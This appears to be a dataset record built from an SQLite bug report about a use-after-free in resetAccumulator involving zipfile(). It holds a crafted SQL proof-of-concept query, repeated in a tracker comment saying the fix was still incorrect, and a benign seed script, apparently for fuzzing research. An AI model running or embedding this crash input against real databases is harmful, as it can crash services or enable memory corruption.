title: Use after free in resetAccumulator.
poc:
WITH c AS(SELECT a)
    SELECT(SELECT(SELECT zipfile(0, b, b)
                      LIMIT(SELECT 0.100000 *
                            AVG(DISTINCT(SELECT 0 FROM a ORDER BY b, b, b))))
               FROM a GROUP BY b,
           b, b) FROM a EXCEPT SELECT b FROM a ORDER BY b,
    b, b;
description:
yongheng added on 2020-06-08 20:26:10:
Seems the fix is still incorrect.

POC:
---
CREATE TABLE a(b);
WITH c AS(SELECT a)
    SELECT(SELECT(SELECT zipfile(0, b, b)
                      LIMIT(SELECT 0.100000 *
                            AVG(DISTINCT(SELECT 0 FROM a ORDER BY b, b, b))))
               FROM a GROUP BY b,
           b, b) FROM a EXCEPT SELECT b FROM a ORDER BY b,
    b, b;
---
bug_features_seed: CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, age INTEGER, balance REAL DEFAULT 0.0);
INSERT INTO users(name, age, balance) VALUES('Alice', 30, 100.50);
INSERT INTO users(name, age) VALUES('Bob', NULL);
SELECT name, (CASE WHEN age IS NULL THEN 'Unknown' ELSE age END) AS age_status FROM users;
SELECT zipfile(0, id, balance) FROM users WHERE balance > (SELECT AVG(balance) FROM users) ORDER BY name;
